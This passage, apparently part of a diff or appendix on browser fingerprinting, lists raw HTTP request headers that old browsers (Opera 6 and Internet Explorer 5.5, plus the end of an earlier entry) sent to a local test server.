+ Accept: text/xml, application/xml, application/xhtml+xml, text/html;q=0.9,
+        image/png, image/jpeg, image/gif;q=0.2, text/plain;q=0.8, text/css,
+        */*;q=0.1
+ Accept-Language: en-us
+ Accept-Encoding: gzip,deflate,compress,identity
+ Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66
+ Keep-Alive: 300
+ Connection: keep-alive
+
+
+- [B.1.4] - Browser footprints - Opera 6
+ GET / HTTP/1.1
+ User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 6.0  [en]
+ Host: localhost:8008
+ Accept: text/html, image/png, image/jpeg, image/gif, image/x-xbitmap, */*
+ Accept-Language: en
+ Accept-Charset: iso-8859-1,utf-8,iso-2022-jp,shift_jis,big5,utf-16,euc-jp,
+        euc-kr,x-gbk,hz-gb-2312,euc-tw,koi8-r,koi8-u,viscii,windows-sami-2,
+        ibm866,iso-8859-2,iso-8859-3,iso-8859-4,iso-8859-5,iso-8859-6,
+        iso-8859-7,iso-8859-8,iso-8859-9,iso-8859-10,iso-8859-11,iso-8859-13,
+        iso-8859-14,iso-8859-15,windows-1258,windows-1251,windows-1250,
+        windows-1253,windows-1252,windows-1255,windows-1254,windows-1257,
+        windows-1256,windows-sami-2
+ Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
+ Connection: Keep-Alive
+
+
+- [B.1.5] - Browser footprints - Internet Explorer 5.50.4134.0100
+ GET / HTTP/1.1
+ Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+ Accept-Language: en-ca
+ Accept-Encoding: gzip, deflate
+ User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)
+ Host: localhost:8008
+ Connection: Keep-Alive
